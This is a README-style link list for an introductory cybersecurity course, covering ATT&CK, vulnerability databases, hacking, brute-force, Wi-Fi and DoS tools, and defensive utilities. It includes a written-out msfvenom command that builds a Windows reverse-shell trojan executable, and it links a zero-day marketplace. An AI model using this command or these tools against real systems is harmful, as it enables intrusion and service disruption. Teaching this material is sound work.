# Introduction to Cyber Security

"Introduction to Cyber Security" базови познания в сферата на киберсигурността. 

---------------------------------------------------------------

## Frameworks for Recording Threat Actions

- [ATT&CK Matrix for Enterprise](https://attack.mitre.org/) - MITRE ATT&CK® is a globally accessible knowledge base of adversary tactics and techniques based on real-world observations. The ATT&CK knowledge base is used as a foundation for developing specific threat models and methodologies in the private sector, government, and cybersecurity product and service community.

---------------------------------------------------------------

## IDS / IPS (Intrusion Detection System / Intrusion Prevention System)

- [Snort](https://www.snort.org/) - Snort is an Open Source Intrusion Prevention System (IPS). Snort IPS uses a series of rules that help define malicious network activity, which is used to find packets that match against them and generate alerts for users. Snort can be deployed to stop these packets, as well. Snort has three primary uses: As a packet sniffer like tcpdump and as a packet logger, which is helpful for network traffic debugging and can be used as a full-blown network intrusion prevention system.
- [Live Cyber Threat Map](https://threatmap.checkpoint.com/) - a real-time map of the computer security attacks occurring at any given time.

---------------------------------------------------------------

## Vulnerabilities `CVE-YEAR OF DISCOVERY-ID`

- [CVE Org](https://www.cve.org/) - Identify, define, and catalog publicly disclosed cybersecurity vulnerabilities
- [ExploitDB](https://www.exploit-db.com/) - Search for Vulnerabilities
- [National Vulnerability Database](https://nvd.nist.gov/) - U.S. government repository of standards-based vulnerability management data represented using the Security Content Automation Protocol (SCAP). This data enables automation of vulnerability management, security measurement, and compliance. The NVD includes databases of security checklist references, security-related software flaws, product names, and impact metrics.
- [CVE Details](https://www.cvedetails.com/) - a complete CVE database enhanced with additional information, including advisories, exploits, tools, source code changes, etc.
- [Publicly Available Penetration Testing Reports](https://github.com/juliocesarfort/public-pentesting-reports) - A repository containing public penetration test reports published by consulting firms and academic security groups.

---------------------------------------------------------------

## Hacking Tools 
- [Responder](https://github.com/SpiderLabs/Responder) - Responder is an open-source tool primarily used for NetBIOS and LLMNR poisoning attacks. NetBIOS (Network Basic Input/Output System) and LLMNR (Link-Local Multicast Name Resolution) facilitate communication between devices on a local network.
- [John the Ripper](https://github.com/openwall/john) - John the Ripper is a fast password cracker, currently available for many flavors of Unix, macOS, Windows, DOS, BeOS, and OpenVMS (the latter requires a contributed patch). Its primary purpose is to detect weak Unix passwords. Besides several crypt(3) password hash types most commonly found on various Unix flavors, supported out of the box are Kerberos/AFS and Windows LM hashes, as well as DES-based tripcodes, plus hundreds of additional hashes and ciphers in "-jumbo" versions.
- [Zero Days Marketplace](https://0day.today/) - Zero Day Vulnerabilities. Zero Day means that they are brand new, and there
is not a fix or patch for them.
- [The Social-Engineer Toolkit (SET)](https://github.com/trustedsec/social-engineer-toolkit) - The Social-Engineer Toolkit is an open-source penetration testing framework designed for social engineering. SET has several custom attack vectors that allow you to make a believable attack quickly. SET is a product of TrustedSec, LLC – an information security consulting firm located in Cleveland, Ohio.
- [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) - LinPEAS is a script that searches for possible paths to escalate privileges on Linux/Unix*/MacOS hosts.

---------------------------------------------------------------

## Brute Forcing Attacks

- [Hydra](https://github.com/vanhauser-thc/thc-hydra) - Hydra (or THC Hydra) is a parallelized network login cracker built in various operating systems like Kali Linux
- [Burp Intruder](https://portswigger.net/burp/pro) - Burp Intruder is a tool for automating customized attacks against web applications.
- [Medusa](https://github.com/jmk-foofus/medusa) - Medusa is a speedy, parallel, and modular login brute-forcer. The goal is to support as many services that allow remote authentication as possible.

---------------------------------------------------------------


## Frameworks to Perform Wi-Fi Attacks

- [Airgeddon](https://github.com/v1s1t0r1sh3r3/airgeddon) - This is a multi-use bash script for Linux systems to audit wireless networks.
- [WiFiPhisher](https://github.com/wifiphisher/wifiphisher) - Wifiphisher is a rogue Access Point framework for conducting red team engagements or Wi-Fi security testing. Using Wifiphisher, penetration testers can quickly achieve a man-in-the-middle position against wireless clients by performing targeted Wi-Fi association attacks.
- [WiFi Exploitation Framework](https://github.com/D3Ext/WEF) - This is an entirely offensive framework for auditing Wi-Fi networks with different types of attacks for WPA/WPA2, WPS, and WEP, automated handshake cracking, and much more.

---------------------------------------------------------------

## DoS Tools - Denial of Service (DOS)

- [Low Orbit Ion Cannon](https://github.com/NewEraCracker/LOIC) - Low Orbit Ion Cannon (LOIC) is an open-source network stress tool written in C# (TCP, UDP, HTTP GET FLOODS).
- [High Orbit Ion Cannon](https://sourceforge.net/projects/highorbitioncannon/) - HTTP GET / POST requests
- [hping3](https://www.kali.org/tools/hping3/) - hping3 is a network tool that sends custom ICMP/UDP/TCP packets and displays target replies like ping does with ICMP replies. It handles fragmentation and arbitrary packet body and size and can transfer files under supported protocols. Using hping3, you can test firewall rules, perform (spoofed) port scanning, test network performance using different protocols, do path MTU discovery, perform traceroute-like actions under different protocols, fingerprint remote operating systems, audit TCP/IP stacks, etc. hping3 is scriptable using the Tcl language.
- [Tors Hammer](https://github.com/Karlheinzniebuhr/torshammer) - As the name suggests, the tool can perform attacks inside the Tor network. By default, Tor's Hammer operates on level 7 of the OSI Model and attacks the whole TCP stack. The way it works is simple. The tool opens multiple dead connections and, thus, hangs the application since it cannot return results. However, instead of a crushing action like the literal Thor hammer, it is specialized for anonymous attacks. The tool is built in a way that uses anonymity as leverage to evade firewalls and security mitigations. Pen testers also use it for demo attacks on security structures. This tool has a downside. However, the primary network (Tor) is usually very slow. This speed limit automatically limits how effective these tools can be.

---------------------------------------------------------------

## Generate Trojan for Reverse Shell Callback

- [Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/msfvenom/) - Msfvenom enables you to generate custom payloads for specific targets. The tool was created by combining two previous Metasploit tools—msfencode and msfpayload. Msfvenom can help get past the security of a target protected by a firewall or an antivirus. `msfvenom –p windows/x64/shell/reverse_tcp LHOST=IP LPORT=PORT –f exe –o file.exe`

---------------------------------------------------------------

## Security Tools

- [OpenVPN](https://openvpn.net/) Virtual Private Network - Infrastructure that allows machines to connect in
a secure way
- [Tor Network](https://www.torproject.org/) This network is used for anonymity online
- [JWT Token](https://jwt.io/) JSON Web Token - Used for authorization in web apps. It relies on a secret to validate its signature. JWT token is instantiated upon a valid login
- [Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) - Applied algorithm to "obfuscate" a secret

---------------------------------------------------------------

## Penetration Testing Tools

- [Nessus](https://www.tenable.com/products/nessus) - Nessus is vulnerability scanning solution
- [Nmap](https://nmap.org/) - Nmap ("Network Mapper") is a free and open-source utility for network discovery and security auditing. 
- [BurpSuite](https://portswigger.net/burp) - The class-leading vulnerability scanning, penetration testing, and web app security platform.
- [Searchsploit](https://www.exploit-db.com/searchsploit) - Searchsploit is a command line search tool for Exploit-DB that allows you to take a copy of Exploit Database anywhere you go.

---------------------------------------------------------------

## Penetration Testing Operational Systems

- [Kali Linux](https://www.kali.org/)
- [Parrot OS](https://www.parrotsec.org/)
- [Black Arch](https://blackarch.org/)
- [CommandoVM](https://github.com/mandiant/commando-vm)

---------------------------------------------------------------

## Example of interesting ports:

- 22 / SSH
- 80 / HTTP
- 443 / HTTPS
- 389 / LDAP

---------------------------------------------------------------

## Example of exciting commands:

- How to Check What Ports are Opened on Your PC
  - Windows:
    - `netstat –an`
    - `netstat –antb`
  - Linux:
    - `ss –nltp`
    - `netstat –tulpn`


